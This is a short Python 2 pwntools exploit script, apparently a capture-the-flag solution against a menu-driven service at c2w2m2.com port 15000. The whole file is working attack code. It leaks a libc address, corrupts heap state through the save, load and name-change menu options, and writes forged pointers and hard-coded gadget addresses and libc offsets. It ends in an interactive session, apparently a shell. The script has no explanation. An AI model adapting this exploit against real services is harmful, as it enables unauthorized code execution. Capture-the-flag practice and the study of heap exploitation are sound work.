from pwn import *

HOST = "c2w2m2.com"
PORT = 15000
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)

def alloc(packed_size, dat):
  s.recvuntil('>>>')
  s.sendline('1')
  s.recvuntil('name: ')
  s.send(dat)
  s.recvuntil('size: ')
  s.sendline(str(packed_size))
def unpacked():
  s.recvuntil('>>>')
  s.sendline('4')
def change_name(dat):
  s.recvuntil('>>>')
  s.sendline('9')
  s.recvuntil('name:')
  s.send(dat)
def save(index):
  s.recvuntil('>>>')
  s.sendline('8')
  s.recvuntil('idx:')
  s.sendline(str(index))
def load(index):
  s.recvuntil('>>>')
  s.sendline('7')
  s.recvuntil('idx:')
  s.sendline(str(index))
raw_input()
alloc(0x100,"A"*0x68)
unpacked()
s.recvuntil('>>>')
s.sendline('5')
libc = u64(s.recvuntil('\x7f')[-6:]+'\x00\x00')
print "libc : ", hex(libc)
alloc(0x100,"A"*0x68)
save(0)
alloc(0x100,"A"*0x68)
save(1)
'''
unpacked()
save(0)
alloc(0x100,"A"*0x100)
'''
change_name("\x00")
load(0)
change_name("\x00")
load(1)
change_name('\x00')
alloc(0x100,p64(libc-0x8b)+"B"*0x60)
alloc(0x100,"A"*0x68)
alloc(0x100,"B"*0x68)
#alloc(0x100,"B"*0x68)
alloc(0x100,"\x41"*0x13+p64(0x0000000000400f44)+"AAAAA"+p64(0x0000000000401363)+p64(libc-0x237e21)+p64(libc-0x37f7e8)+"\x41"*(0x4d-5-8-8-8))
#s.send('\x00'*0x100)
s.interactive()
